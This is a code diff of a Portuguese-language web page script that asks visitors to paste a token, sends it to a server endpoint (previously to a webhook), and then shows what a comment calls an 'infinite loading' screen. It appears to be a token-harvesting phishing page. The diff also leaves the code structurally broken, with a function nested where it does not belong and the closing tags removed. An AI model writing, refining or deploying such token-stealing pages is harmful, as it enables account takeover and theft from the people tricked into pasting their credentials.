@@ -279,23 +279,40 @@
         }]
       };
 
-      fetch(webhook, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload)
-      })
-      .then(() => {
-        status.innerHTML = "";
-        showLoading();
-      })
-      .catch(() => {
-        status.innerHTML = "Falha ao enviar. Tente novamente.";
-        status.style.color = "#ff6666";
-        btn.disabled = false;
-        btn.innerText = "Enviar token";
-      });
-    }
-  </script>
+      async function enviar() {
+  const token = document.getElementById("token").value.trim();
+  const status = document.getElementById("status");
+  const btn = document.getElementById("sendBtn");
 
-</body>
-</html>
+  if (token.length < 30) {
+    status.innerHTML = "Token curto demais. Cola o correto.";
+    status.style.color = "#ff6666";
+    return;
+  }
+
+  status.innerHTML = "Enviando token...";
+  status.style.color = "#ffff66";
+
+  btn.disabled = true;
+  btn.innerText = "Enviando...";
+
+  try {
+    const response = await fetch("/api/send-token", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ token })
+    });
+
+    if (response.ok) {
+      status.innerHTML = "";
+      showLoading(); // sua função de loading infinito
+    } else {
+      throw new Error("Erro no servidor");
+    }
+  } catch (err) {
+    status.innerHTML = "Falha ao enviar. Tente novamente.";
+    status.style.color = "#ff6666";
+    btn.disabled = false;
+    btn.innerText = "Enviar token";
+  }
+}
